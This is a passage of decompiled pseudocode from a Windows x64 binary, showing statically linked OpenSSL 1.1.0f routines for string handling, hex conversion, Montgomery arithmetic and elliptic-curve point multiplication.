           && (unsigned int)sub_14006B820(v15)
           && (unsigned int)sub_14006B820(v15)
           && sub_14006B500((__int64)v15, (__int64)Src, 0i64) )
      {
        v17 = a7 - v10;
        if ( v11 + v10 <= a7 )
          v17 = v11;
        memmove((void *)(v10 + a6), Src, v17);
        ++v16;
        v10 += v17;
        if ( v16 > v12 )
          goto LABEL_17;
      }
    }
    sub_14006B2F0(v15);
  }
  return 0i64;
}

//----- (000000014003BAB0) ----------------------------------------------------
void *__fastcall sub_14003BAB0(const void *a1, size_t a2)
{
  void *v4; // rax
  void *v5; // rdi

  if ( !a1 || a2 >= 0x7FFFFFFF )
    return 0i64;
  v4 = sub_14001D8E0(a2);
  v5 = v4;
  if ( v4 )
  {
    memmove(v4, a1, a2);
    return v5;
  }
  else
  {
    sub_140024610(15, 115, 65, (unsigned int)"..\\..\\openssl-1.1.0f\\crypto\\o_str.c", 69);
    return 0i64;
  }
}
// 140024610: using guessed type __int64 __fastcall sub_140024610(_DWORD, _DWORD, _DWORD, _DWORD, _DWORD);

//----- (000000014003BB60) ----------------------------------------------------
void *__fastcall sub_14003BB60(_BYTE *a1)
{
  const void *v1; // rbx
  unsigned int i; // eax
  size_t v4; // rsi
  void *v5; // rax
  void *v6; // rdi

  v1 = a1;
  if ( !a1 )
    return 0i64;
  for ( i = 0; *a1; ++i )
  {
    if ( i >= 0x80000000 )
      break;
    ++a1;
  }
  v4 = (i & 0x7FFFFFFF) + 1;
  v5 = sub_14001D8E0(v4);
  v6 = v5;
  if ( v5 )
    memmove(v5, v1, (unsigned int)v4);
  return v6;
}

//----- (000000014003BBE0) ----------------------------------------------------
_BYTE *__fastcall sub_14003BBE0(_BYTE *a1, __int64 a2)
{
  _BYTE *i; // rbx
  size_t v5; // rbx
  _BYTE *v6; // rax
  _BYTE *v7; // rdi

  if ( !a1 )
    return 0i64;
  for ( i = a1; a2; ++i )
  {
    --a2;
    if ( !*i )
      break;
  }
  v5 = i - a1;
  v6 = sub_14001D8E0(v5 + 1);
  v7 = v6;
  if ( v6 )
  {
    memmove(v6, a1, v5);
    v7[v5] = 0;
  }
  return v7;
}

//----- (000000014003BC70) ----------------------------------------------------
_BYTE *__fastcall sub_14003BC70(unsigned __int8 *a1, unsigned int a2)
{
  int v2; // eax
  __int64 v3; // rdi
  _BYTE *v6; // rax
  _BYTE *v7; // r8
  __int64 v8; // rdx
  unsigned __int64 v9; // rcx

  v3 = a2;
  if ( !a2 )
    return sub_14001DC20((unsigned int)(v2 - 47));
  v6 = sub_14001D8E0((int)(3 * a2));
  v7 = v6;
  if ( v6 )
  {
    if ( (int)v3 > 0 )
    {
      v8 = v3;
      do
      {
        v9 = *a1++;
        *v6 = a0123456789abcd_2[v9 >> 4];
        v6[1] = a0123456789abcd_2[*(a1 - 1) & 0xF];
        v6[2] = 58;
        v6 += 3;
        --v8;
      }
      while ( v8 );
    }
    *(v6 - 1) = 0;
    return v7;
  }
  else
  {
    sub_140024610(15, 117, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\o_str.c", 207);
    return 0i64;
  }
}
// 14003BC99: variable 'v2' is possibly undefined

//----- (000000014003BD50) ----------------------------------------------------
__int64 __fastcall sub_14003BD50(char a1)
{
  __int64 result; // rax

  switch ( a1 )
  {
    case '0':
      result = 0i64;
      break;
    case '1':
      result = 1i64;
      break;
    case '2':
      result = 2i64;
      break;
    case '3':
      result = 3i64;
      break;
    case '4':
      result = 4i64;
      break;
    case '5':
      result = 5i64;
      break;
    case '6':
      result = 6i64;
      break;
    case '7':
      result = 7i64;
      break;
    case '8':
      result = 8i64;
      break;
    case '9':
      result = 9i64;
      break;
    case 'A':
    case 'a':
      result = 10i64;
      break;
    case 'B':
    case 'b':
      result = 11i64;
      break;
    case 'C':
    case 'c':
      result = 12i64;
      break;
    case 'D':
    case 'd':
      result = 13i64;
      break;
    case 'E':
    case 'e':
      result = 14i64;
      break;
    case 'F':
    case 'f':
      result = 15i64;
      break;
    default:
      result = 0xFFFFFFFFi64;
      break;
  }
  return result;
}

//----- (000000014003BE60) ----------------------------------------------------
void *__fastcall sub_14003BE60(char *a1, _DWORD *a2)
{
  unsigned int v2; // eax
  char *i; // rbx
  void *v5; // rax
  void *v6; // r14
  _BYTE *v8; // rdi
  char v9; // si
  char v10; // cl
  int v11; // ebp
  int v12; // eax

  v2 = 0;
  for ( i = a1; *a1; ++v2 )
  {
    if ( v2 >= 0x80000000 )
      break;
    ++a1;
  }
  v5 = sub_14001D8E0((v2 >> 1) & 0x3FFFFFFF);
  v6 = v5;
  if ( !v5 )
  {
    sub_140024610(15, 118, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\o_str.c", 160);
    return 0i64;
  }
  v8 = v5;
  while ( *i )
  {
    v9 = *i++;
    if ( v9 != 58 )
    {
      v10 = *i++;
      if ( !v10 )
      {
        sub_140024610(15, 118, 103, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\o_str.c", 170);
        sub_14001D930(v6);
        return 0i64;
      }
      v11 = sub_14003BD50(v10);
      v12 = sub_14003BD50(v9);
      if ( v11 < 0 || v12 < 0 )
      {
        sub_14001D930(v6);
        sub_140024610(15, 118, 102, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\o_str.c", 178);
        return 0i64;
      }
      *v8++ = v11 | (16 * v12);
    }
  }
  if ( a2 )
    *a2 = (_DWORD)v8 - (_DWORD)v6;
  return v6;
}

//----- (000000014003BFE0) ----------------------------------------------------
__int64 __fastcall sub_14003BFE0(_BYTE *a1, _BYTE *a2, unsigned __int64 a3)
{
  __int64 v3; // rax
  __int64 i; // r10
  __int64 v5; // r11
  bool v6; // cf

  v3 = 0i64;
  for ( i = 0i64; a3; --a3 )
  {
    if ( !*a1 )
      break;
    ++i;
    ++a1;
  }
  v5 = 0i64;
  if ( a3 > 1 )
  {
    do
    {
      if ( !*a2 )
        break;
      *a1++ = *a2++;
      ++v5;
      v6 = a3-- == 1;
    }
    while ( !v6 && a3 != 1 );
  }
  if ( a3 )
    *a1 = 0;
  for ( ; *a2; v3 = (unsigned int)(v3 + 1) )
  {
    if ( (unsigned int)v3 >= 0x80000000 )
      break;
    ++a2;
  }
  LODWORD(v3) = v3 & 0x7FFFFFFF;
  return i + v5 + v3;
}

//----- (000000014003C060) ----------------------------------------------------
__int64 __fastcall sub_14003C060(_BYTE *a1, _BYTE *a2, unsigned __int64 a3)
{
  __int64 v3; // rax
  __int64 v4; // r10
  bool v5; // cf

  v3 = 0i64;
  v4 = 0i64;
  if ( a3 > 1 )
  {
    do
    {
      if ( !*a2 )
        break;
      *a1++ = *a2++;
      ++v4;
      v5 = a3-- == 1;
    }
    while ( !v5 && a3 != 1 );
  }
  if ( a3 )
    *a1 = 0;
  for ( ; *a2; v3 = (unsigned int)(v3 + 1) )
  {
    if ( (unsigned int)v3 >= 0x80000000 )
      break;
    ++a2;
  }
  LODWORD(v3) = v3 & 0x7FFFFFFF;
  return v4 + v3;
}

//----- (000000014003C0C0) ----------------------------------------------------
_BYTE *__fastcall sub_14003C0C0(_BYTE *a1, __int64 a2)
{
  _BYTE *i; // rax

  for ( i = a1; a2; ++i )
  {
    --a2;
    if ( !*i )
      break;
  }
  return (_BYTE *)(i - a1);
}

//----- (000000014003C0E0) ----------------------------------------------------
_BOOL8 __fastcall sub_14003C0E0(int a1, char *a2, size_t a3)
{
  return strerror_s(a2, a3, a1) == 0;
}

//----- (000000014003C110) ----------------------------------------------------
__int64 __fastcall sub_14003C110(__int64 a1, unsigned int a2)
{
  unsigned int (__fastcall *v2)(__int64, __int64 *, _QWORD, _QWORD); // rax
  __int64 v4; // [rsp+40h] [rbp+8h] BYREF

  v2 = *(unsigned int (__fastcall **)(__int64, __int64 *, _QWORD, _QWORD))(a1 + 72);
  if ( v2 && v2(a1, &v4, 0i64, a2) )
    return v4;
  sub_140024610(38, 192, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\engine\\tb_pkmeth.c", 76);
  return 0i64;
}

//----- (000000014003C170) ----------------------------------------------------
__int64 __fastcall sub_14003C170(int a1)
{
  return sub_1400417E0(&qword_140142C78, a1);
}
// 140142C78: using guessed type __int64 qword_140142C78;

//----- (000000014003C190) ----------------------------------------------------
__int64 __fastcall sub_14003C190(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, int **, _QWORD); // rax
  int v3; // eax
  int *v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, int **, _QWORD))(a1 + 72);
  if ( v1 && (v3 = v1(a1, 0i64, &v5, 0i64), v3 > 0) )
    return sub_140041620(&qword_140142C78, (__int64)sub_14003C2F0, a1, v5, v3, 0);
  else
    return 1i64;
}
// 140142C78: using guessed type __int64 qword_140142C78;

//----- (000000014003C200) ----------------------------------------------------
__int64 __fastcall sub_14003C200(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, int **, _QWORD); // rax
  int v3; // eax
  int *v5; // [rsp+40h] [rbp+8h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, int **, _QWORD))(a1 + 72);
  if ( v1 && (v3 = v1(a1, 0i64, &v5, 0i64), v3 > 0) )
    return sub_140041620(&qword_140142C78, (__int64)sub_14003C2F0, a1, v5, v3, 1);
  else
    return 1i64;
}
// 140142C78: using guessed type __int64 qword_140142C78;

//----- (000000014003C270) ----------------------------------------------------
void __fastcall sub_14003C270(__int64 a1)
{
  __int64 (__fastcall *v1)(__int64, _QWORD, __int64 *, _QWORD); // rax
  int v3; // eax
  __int64 v4; // rbx
  __int64 i; // rsi
  __int64 v6; // [rsp+30h] [rbp+8h] BYREF
  _BYTE *v7; // [rsp+38h] [rbp+10h] BYREF

  v1 = *(__int64 (__fastcall **)(__int64, _QWORD, __int64 *, _QWORD))(a1 + 72);
  if ( v1 )
  {
    v3 = v1(a1, 0i64, &v6, 0i64);
    v4 = 0i64;
    for ( i = v3; v4 < i; ++v4 )
    {
      if ( (*(unsigned int (__fastcall **)(__int64, _BYTE **, _QWORD, _QWORD))(a1 + 72))(
             a1,
             &v7,
             0i64,
             *(unsigned int *)(v6 + 4 * v4)) )
      {
        sub_1400208B0(v7);
      }
    }
  }
}

//----- (000000014003C2F0) ----------------------------------------------------
__int64 sub_14003C2F0()
{
  return sub_140041580(&qword_140142C78);
}
// 140142C78: using guessed type __int64 qword_140142C78;

//----- (000000014003C310) ----------------------------------------------------
__int64 __fastcall sub_14003C310(__int64 a1, __int64 a2)
{
  if ( a1 != a2 )
  {
    if ( !sub_140026E90(a1 + 8, a2 + 8) || !sub_140026E90(a1 + 32, a2 + 32) || !sub_140026E90(a1 + 56, a2 + 56) )
      return 0i64;
    *(_DWORD *)a1 = *(_DWORD *)a2;
    *(_QWORD *)(a1 + 80) = *(_QWORD *)(a2 + 80);
    *(_QWORD *)(a1 + 88) = *(_QWORD *)(a2 + 88);
  }
  return a1;
}

//----- (000000014003C3A0) ----------------------------------------------------
void __fastcall sub_14003C3A0(__int64 a1)
{
  if ( a1 )
  {
    sub_140026A10((__int64 *)(a1 + 8));
    sub_140026A10((__int64 *)(a1 + 32));
    sub_140026A10((__int64 *)(a1 + 56));
    if ( (*(_BYTE *)(a1 + 96) & 1) != 0 )
      sub_14001D930((void *)a1);
  }
}

//----- (000000014003C400) ----------------------------------------------------
_DWORD *__fastcall sub_14003C400()
{
  int v0; // eax
  _DWORD *result; // rax
  _DWORD *v2; // rbx

  result = sub_14001D8E0((unsigned int)(v0 + 72));
  v2 = result;
  if ( result )
  {
    *result = 0;
    sub_140027B10((__int64)(result + 2));
    sub_140027B10((__int64)(v2 + 8));
    sub_140027B10((__int64)(v2 + 14));
    *((_QWORD *)v2 + 11) = 0i64;
    result = v2;
    *((_QWORD *)v2 + 10) = 0i64;
    v2[24] = 1;
  }
  return result;
}
// 14003C41C: variable 'v0' is possibly undefined

//----- (000000014003C480) ----------------------------------------------------
__int64 __fastcall sub_14003C480(__int64 a1, __int64 **a2, int *a3)
{
  unsigned int v6; // edi
  int *v8; // rbx
  int v9; // eax
  bool v10; // zf
  int v11; // eax
  __int64 v12; // rcx
  __int64 v13[2]; // [rsp+30h] [rbp-48h] BYREF
  __int64 *v14; // [rsp+40h] [rbp-38h] BYREF
  BOOL v15; // [rsp+48h] [rbp-30h]
  __int64 v16; // [rsp+4Ch] [rbp-2Ch]

  v6 = 0;
  if ( sub_140027160((__int64)a2) )
    return 0i64;
  sub_140027D40(a3);
  v8 = (int *)sub_140027C40(a3);
  if ( v8 )
  {
    if ( sub_140026E90(a1 + 32, (__int64)a2) )
    {
      *(_DWORD *)(a1 + 48) = 0;
      sub_140027B10((__int64)&v14);
      v16 = 2i64;
      v14 = v13;
      v9 = sub_140027260((__int64)a2);
      *(_DWORD *)a1 = ((((v9 + 63) >> 31) & 0x3F) + v9 + 63) & 0xFFFFFFC0;
      sub_140027560(a1 + 8, 0i64);
      if ( (unsigned int)sub_140027480(a1 + 8, 64) )
      {
        v10 = **a2 == 0;
        v13[0] = **a2;
        v13[1] = 0i64;
        v15 = !v10;
        if ( sub_14006FDD0(v8, a1 + 8, (__int64 *)&v14, a3) )
        {
          if ( (unsigned int)sub_140046E40((__int64)v8, (__int64 *)v8, 64) )
          {
            v11 = sub_140027160((__int64)v8) ? sub_140027560((__int64)v8, -1i64) : sub_14003E980((__int64)v8, 1ui64);
            if ( v11 && (unsigned int)sub_140041D70(v8, 0i64, (__int64)v8, (__int64)&v14, a3) )
            {
              if ( v8[2] <= 0 )
                v12 = 0i64;
              else
                v12 = **(_QWORD **)v8;
              *(_QWORD *)(a1 + 80) = v12;
              *(_QWORD *)(a1 + 88) = 0i64;
              sub_140027560(a1 + 8, 0i64);
              if ( (unsigned int)sub_140027480(a1 + 8, 2 * *(_DWORD *)a1) )
              {
                if ( (unsigned int)sub_140041D70(0i64, a1 + 8, a1 + 8, a1 + 32, a3) )
                  v6 = 1;
              }
            }
          }
        }
      }
    }
  }
  sub_140027B60((__int64)a3);
  return v6;
}

//----- (000000014003C690) ----------------------------------------------------
__int64 __fastcall sub_14003C690(__int64 *a1, _DWORD *a2, __int64 **a3, int *a4)
{
  __int64 v8; // rbx
  _DWORD *v9; // rax

  sub_140025C50(a2);
  v8 = *a1;
  sub_140025CE0(a2);
  if ( !v8 )
  {
    v9 = sub_14003C400();
    v8 = (__int64)v9;
    if ( !v9 )
      return 0i64;
    if ( !(unsigned int)sub_14003C480((__int64)v9, a3, a4) )
    {
      sub_14003C3A0(v8);
      return 0i64;
    }
    sub_140025D20(a2);
    if ( *a1 )
    {
      sub_14003C3A0(v8);
      v8 = *a1;
    }
    else
    {
      *a1 = v8;
    }
    sub_140025CE0(a2);
  }
  return v8;
}

//----- (000000014003C750) ----------------------------------------------------
__int64 __fastcall sub_14003C750(__int64 a1, __int64 a2, __int64 a3, int *a4)
{
  unsigned int v8; // ebx
  _QWORD *v9; // rax
  __int64 v10; // rsi

  v8 = 0;
  sub_140027D40(a4);
  v9 = sub_140027C40(a4);
  v10 = (__int64)v9;
  if ( v9 && sub_140026E90((__int64)v9, a2) )
    v8 = sub_14003C7E0(a1, v10, a3);
  sub_140027B60((__int64)a4);
  return v8;
}

//----- (000000014003C7E0) ----------------------------------------------------
__int64 __fastcall sub_14003C7E0(__int64 a1, __int64 a2, __int64 a3)
{
  __int64 v3; // rsi
  __int64 v5; // r15
  __int64 v6; // r12
  __int64 result; // rax
  int v8; // ebp
  __int64 v9; // rcx
  char *v10; // rdi
  unsigned __int64 v11; // rbp
  __int64 v12; // r14
  __int64 v13; // r12
  unsigned __int64 v14; // rax
  unsigned __int64 v15; // r8
  unsigned __int64 v16; // rax
  char *v17; // r13
  char *v18; // rcx
  __int64 v19; // rdi
  __int64 v20; // r14
  unsigned __int64 v21; // rbp
  unsigned __int64 v22; // r10
  unsigned __int64 v23; // r11
  char *v24; // rsi
  __int64 *v25; // rax
  char *v26; // rbp
  unsigned __int64 v27; // r11
  __int64 v28; // rcx
  __int64 v29; // rdx
  __int64 v30; // r9
  __int64 v31; // r8
  unsigned __int64 v32; // r10
  char *v33; // rcx
  char *v34; // r14
  __int64 v35; // rdi
  char *v38; // [rsp+80h] [rbp+18h]
  int v39; // [rsp+80h] [rbp+18h]

  v3 = *(int *)(a3 + 40);
  v5 = a2;
  v6 = a1;
  if ( (_DWORD)v3 )
  {
    v8 = 2 * v3;
    result = (__int64)sub_140027B30(a2, 2 * (int)v3);
    if ( result )
    {
      *(_DWORD *)(v5 + 16) ^= *(_DWORD *)(a3 + 48);
      v9 = *(int *)(v5 + 8);
      v38 = *(char **)(a3 + 32);
      v10 = *(char **)v5;
      if ( v8 != (_DWORD)v9 )
        memset(&v10[8 * v9], 0, 8i64 * (v8 - (int)v9));
      *(_DWORD *)(v5 + 8) = v8;
      v11 = 0i64;
      if ( (int)v3 > 0 )
      {
        v12 = (unsigned int)v3;
        v13 = *(_QWORD *)(a3 + 80);
        do
        {
          v14 = sub_140070B50(v10, v38, v3, *(_QWORD *)v10 * v13);
          v15 = *(_QWORD *)&v10[8 * v3];
          v16 = v15 + v11 + v14;
          *(_QWORD *)&v10[8 * v3] = v16;
          v10 += 8;
          v11 = (v16 <= v15) & ((v16 != v15) | v11);
          --v12;
        }
        while ( v12 );
        v5 = a2;
        v6 = a1;
      }
      result = (__int64)sub_140027B30(v6, v3);
      if ( result )
      {
        v17 = *(char **)v6;
        v18 = *(char **)v6;
        *(_DWORD *)(v6 + 8) = v3;
        v19 = v3;
        *(_DWORD *)(v6 + 16) = *(_DWORD *)(v5 + 16);
        v20 = *(_QWORD *)v5 + 8 * v3;
        v21 = v11 - sub_140075060(v18, (char *)v20, v38, v3);
        v39 = 0;
        v22 = v20 & v21 | (unsigned __int64)v17 & ~v21;
        if ( (int)v3 - 4 > 0 )
        {
          v23 = (unsigned __int64)((int)v3 - 4 - 1i64) >> 2;
          v24 = (char *)(v20 - v22);
          v25 = (__int64 *)(v22 + 16);
          v26 = &v17[-v22];
          v27 = v23 + 1;
          v39 = 4 * v27;
          do
          {
            v28 = *(v25 - 2);
            v29 = *(v25 - 1);
            v30 = *v25;
            *(__int64 *)((char *)v25 + (_QWORD)v24 - 16) = 0i64;
            v31 = v25[1];
            *(__int64 *)((char *)v25 + (_QWORD)v24 - 8) = 0i64;
            *(_QWORD *)&v26[(_QWORD)v25 - 16] = v28;
            *(__int64 *)((char *)v25 + (_QWORD)v24) = 0i64;
            *(_QWORD *)&v26[(_QWORD)v25 - 8] = v29;
            *(__int64 *)((char *)v25 + (_QWORD)v24 + 8) = 0i64;
            *(_QWORD *)&v26[(_QWORD)v25] = v30;
            *(_QWORD *)&v26[(_QWORD)v25 + 8] = v31;
            v25 += 4;
            --v27;
          }
          while ( v27 );
        }
        if ( v39 < v19 )
        {
          v32 = v22 - (_QWORD)v17;
          v33 = &v17[8 * v39];
          v34 = (char *)(v20 - (_QWORD)v17);
          v35 = v19 - v39;
          do
          {
            *(_QWORD *)v33 = *(_QWORD *)&v33[v32];
            *(_QWORD *)&v33[(_QWORD)v34] = 0i64;
            v33 += 8;
            --v35;
          }
          while ( v35 );
        }
        sub_1400278D0(v5);
        sub_1400278D0(v6);
        return 1i64;
      }
    }
  }
  else
  {
    result = 1i64;
    *(_DWORD *)(a1 + 8) = 0;
  }
  return result;
}

//----- (000000014003CA60) ----------------------------------------------------
__int64 __fastcall sub_14003CA60(__int64 a1, __int64 a2, __int64 a3, __int64 a4, int *a5)
{
  unsigned int v9; // edi
  _QWORD *v10; // rax
  __int64 v11; // rbp
  int v12; // eax

  v9 = 0;
  sub_140027D40(a5);
  v10 = sub_140027C40(a5);
  v11 = (__int64)v10;
  if ( v10 )
  {
    if ( a2 == a3 )
      v12 = sub_14006F810((__int64)v10, a2, a5);
    else
      v12 = sub_14006E5B0((__int64)v10, a2, a3, a5);
    if ( v12 && (unsigned int)sub_14003C7E0(a1, v11, a4) )
      v9 = 1;
  }
  sub_140027B60((__int64)a5);
  return v9;
}

//----- (000000014003CB20) ----------------------------------------------------
__int64 __fastcall sub_14003CB20(__int64 a1)
{
  int v1; // eax
  int v4; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
    sub_140025D60((_DWORD *)(a1 + 48), v1 - 31, &v4);
  return a1;
}
// 14003CB44: variable 'v1' is possibly undefined

//----- (000000014003CB60) ----------------------------------------------------
void __fastcall sub_14003CB60(__int64 a1)
{
  __int64 v2; // rbx
  void *v3; // rax
  int v4; // [rsp+30h] [rbp+8h] BYREF

  if ( a1 )
  {
    sub_140025D60((_DWORD *)(a1 + 48), -1, &v4);
    if ( v4 <= 0 )
    {
      v2 = *(_QWORD *)(a1 + 32);
      if ( v2 )
      {
        v3 = *(void **)v2;
        if ( *(_QWORD *)v2 )
        {
          do
          {
            sub_1400222C0(v3);
            v3 = *(void **)(v2 + 8);
            v2 += 8i64;
          }
          while ( v3 );
        }
        sub_14001D930(*(void **)(a1 + 32));
      }
      sub_140025BE0(*(_DWORD **)(a1 + 56));
      sub_14001D930((void *)a1);
    }
  }
}

//----- (000000014003CC10) ----------------------------------------------------
_QWORD *__fastcall sub_14003CC10(__int64 a1)
{
  _QWORD *v3; // rax
  _QWORD *v4; // rbx
  _DWORD *v5; // rax

  if ( !a1 )
    return 0i64;
  v3 = sub_14001DC20(0x40ui64);
  v4 = v3;
  if ( v3 )
  {
    *v3 = a1;
    v3[1] = 8i64;
    v3[3] = 4i64;
    *((_DWORD *)v3 + 12) = 1;
    v5 = sub_140025C10();
    v4[7] = v5;
    if ( v5 )
    {
      return v4;
    }
    else
    {
      sub_140024610(16, 196, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 69);
      sub_14001D930(v4);
      return 0i64;
    }
  }
  else
  {
    sub_140024610(16, 196, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 58);
    return 0i64;
  }
}

//----- (000000014003CD00) ----------------------------------------------------
_BOOL8 __fastcall sub_14003CD00(__int64 a1)
{
  return *(_DWORD *)(a1 + 152) == 5 && *(_QWORD *)(a1 + 160);
}

//----- (000000014003CD20) ----------------------------------------------------
__int64 __fastcall sub_14003CD20(
        __FrameHandler3::TryBlockMap *a1,
        _QWORD *a2,
        __int64 a3,
        unsigned __int64 a4,
        __int64 a5,
        __int64 *a6,
        __int64 a7)
{
  unsigned int v7; // r15d
  __int64 v9; // rdx
  unsigned __int64 v12; // rbp
  void *v13; // rsi
  __int64 v14; // r13
  unsigned int v15; // edi
  __int64 v17; // rcx
  struct _xDISPATCHER_CONTEXT *v18; // rax
  void **v19; // rbp
  char *v20; // rdi
  void *v21; // rax
  char *v22; // rbx
  void *v23; // rax
  void **j; // rbx
  int v25; // eax
  unsigned __int64 v26; // rdx
  size_t v27; // rbx
  void *v28; // rax
  char *v29; // rcx
  char *v30; // r9
  unsigned __int64 v31; // rbx
  unsigned __int64 v32; // rsi
  __int64 *v33; // rdi
  char *v34; // rbx
  __int64 v35; // rcx
  int v36; // eax
  __int64 v37; // rax
  __int64 v38; // rcx
  unsigned __int64 *v39; // rbx
  _BYTE *v40; // rax
  unsigned __int64 v41; // rcx
  int v42; // edx
  _BYTE *v43; // r12
  unsigned __int64 v44; // rcx
  char *v45; // r10
  char *v46; // rax
  unsigned __int64 v47; // r8
  unsigned __int64 v48; // rax
  unsigned __int64 v49; // rax
  _QWORD *v50; // rsi
  char *v51; // rbp
  unsigned __int64 v52; // rdi
  unsigned __int64 v53; // rdx
  __int64 v54; // rax
  __int64 v55; // r13
  size_t *v56; // rbx
  void *v57; // rax
  size_t v58; // rcx
  __int64 v59; // rax
  unsigned __int64 v60; // rbx
  void **v61; // rax
  unsigned __int64 v62; // rbp
  void **v63; // r13
  void **v64; // rbx
  _BYTE *v65; // rsi
  __int64 v66; // r12
  __int64 v67; // rdi
  _QWORD *v68; // rax
  _QWORD *v69; // rbx
  unsigned __int64 v70; // r13
  unsigned __int64 v71; // rsi
  _QWORD ***v72; // rdi
  __int64 v73; // rax
  char *v74; // r12
  struct _xDISPATCHER_CONTEXT *v75; // rdx
  __int64 v76; // rbx
  int v77; // esi
  int v78; // eax
  unsigned __int64 v79; // r13
  unsigned __int64 v80; // rcx
  _QWORD *v81; // rbx
  unsigned __int64 v82; // rbp
  unsigned __int64 v83; // r12
  _QWORD *v84; // rdi
  unsigned __int64 v85; // rdx
  char *v86; // r13
  int v87; // ecx
  int v88; // ebx
  unsigned int v89; // eax
  int v90; // ecx
  __int64 v91; // rax
  __int64 v92; // rax
  void *v93; // [rsp+30h] [rbp-D8h]
  __int64 v94; // [rsp+38h] [rbp-D0h]
  int v95; // [rsp+40h] [rbp-C8h]
  __int64 v96; // [rsp+40h] [rbp-C8h]
  int v97; // [rsp+40h] [rbp-C8h]
  unsigned __int64 v98; // [rsp+48h] [rbp-C0h]
  unsigned __int64 v99; // [rsp+50h] [rbp-B8h] BYREF
  unsigned __int64 v100; // [rsp+58h] [rbp-B0h]
  unsigned __int64 v101; // [rsp+60h] [rbp-A8h]
  char *v102; // [rsp+68h] [rbp-A0h]
  char *v103; // [rsp+70h] [rbp-98h]
  char *v104; // [rsp+78h] [rbp-90h]
  _QWORD *v105; // [rsp+80h] [rbp-88h]
  struct _xDISPATCHER_CONTEXT *v106; // [rsp+88h] [rbp-80h]
  unsigned __int64 v107; // [rsp+90h] [rbp-78h]
  unsigned __int64 v108; // [rsp+98h] [rbp-70h]
  _QWORD *v109; // [rsp+A0h] [rbp-68h]
  unsigned __int64 i; // [rsp+A8h] [rbp-60h]
  __int64 v111; // [rsp+B0h] [rbp-58h]
  __int64 v112; // [rsp+B8h] [rbp-50h]
  char *v113; // [rsp+C0h] [rbp-48h]
  int v114; // [rsp+110h] [rbp+8h]
  __int64 v117; // [rsp+130h] [rbp+28h]

  v7 = 0;
  v9 = *(_QWORD *)a1;
  v109 = 0i64;
  v106 = 0i64;
  v12 = 0i64;
  v13 = 0i64;
  v105 = 0i64;
  v14 = 0i64;
  v100 = 0i64;
  v15 = 0;
  v111 = 0i64;
  v114 = 0;
  v102 = 0i64;
  v104 = 0i64;
  v103 = 0i64;
  v101 = 0i64;
  v95 = 0;
  if ( v9 != *a2 )
  {
    sub_140024610(16, 187, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 159);
    return 0i64;
  }
  if ( !a3 && !a4 )
    return sub_1400229F0((__int64)a1, a2);
  v17 = 0i64;
  if ( a4 )
  {
    while ( v9 == **(_QWORD **)(a5 + 8 * v17) )
    {
      if ( ++v17 >= a4 )
        goto LABEL_10;
    }
    sub_140024610(16, 187, 101, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 169);
    return 0i64;
  }
LABEL_10:
  if ( !a7 )
  {
    v109 = sub_140027CD0();
    if ( !v109 )
      goto LABEL_15;
  }
  if ( !a3 )
    goto LABEL_34;
  v18 = __FrameHandler3::TryBlockMap::getpDC(a1);
  v106 = v18;
  if ( v18 )
  {
    v14 = *((_QWORD *)a1 + 20);
    if ( v14 && *(_QWORD *)(v14 + 16) && !(unsigned int)sub_1400220E0((__int64)a1, v18, **(_QWORD ***)(v14 + 32)) )
    {
      v100 = *(_QWORD *)(v14 + 8);
      v25 = sub_140027260(a3);
      v26 = *(_QWORD *)(v14 + 16);
      v12 = v25 / v100 + 1;
      if ( v12 > v26 )
        v12 = *(_QWORD *)(v14 + 16);
      v111 = 1i64 << (*(_BYTE *)(v14 + 24) - 1);
      if ( *(_QWORD *)(v14 + 40) != v111 * v26 )
      {
        sub_140024610(16, 187, 68, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 211);
        v13 = 0i64;
        goto LABEL_15;
      }
    }
    else
    {
      v12 = 1i64;
      v14 = 0i64;
      v15 = 1;
      v95 = 1;
    }
LABEL_34:
    v98 = v12 + a4;
    v27 = 8 * (v12 + a4);
    v102 = (char *)sub_14001D8E0(v27);
    v103 = (char *)sub_14001D8E0(v27);
    v104 = (char *)sub_14001D8E0(v27 + 8);
    v28 = sub_14001D8E0(v27);
    v29 = v104;
    v13 = v28;
    v93 = v28;
    if ( v104 )
      *(_QWORD *)v104 = 0i64;
    v30 = v102;
    if ( !v102 || !v103 || !v29 || !v28 )
    {
      sub_140024610(16, 187, 65, (__int64)"..\\..\\openssl-1.1.0f\\crypto\\ec\\ec_mult.c", 236);
      v19 = 0i64;
      goto LABEL_16;
    }
    v31 = a4;
    v32 = 0i64;
    v108 = 0i64;
    v107 = a4 + v15;
    if ( v107 )
    {
      v33 = a6;
      i = v29 - (char *)a6;
      v34 = (char *)(v102 - (char *)a6);
      v99 = v102 - (char *)a6;
      v112 = v29 - (char *)a6 + 8;
      v113 = (char *)(v103 - (char *)a6);
      while ( 1 )
      {
        v35 = v32 >= a4 ? a3 : *v33;
        v36 = sub_140027260(v35);
        if ( (unsigned __int64)v36 < 0x7D0 )
        {
          if ( (unsigned __int64)v36 < 0x320 )
          {
            if ( (unsigned __int64)v36 < 0x12C )
              v37 = (unsigned __int64)v36 < 0x46 ? 2i64 - ((unsigned __int64)v36 < 0x14) : 3i64;
            else
              v37 = 4i64;
          }
          else
          {
            v37 = 5i64;
          }
        }
        else
        {
          v37 = 6i64;
        }
        *(__int64 *)((char *)v33 + (_QWORD)v34) = v37;
        v108 += 1i64 << ((unsigned __int8)v37 - 1);
        *(__int64 *)((char *)v33 + v112) = 0i64;
        v38 = v32 >= a4 ? a3 : *v33;
        v39 = (unsigned __int64 *)&v113[(_QWORD)v33];
        v40 = sub_1400751A0(v38, *(_DWORD *)((char *)v33 + v99), (unsigned __int64 *)&v113[(_QWORD)v33]);
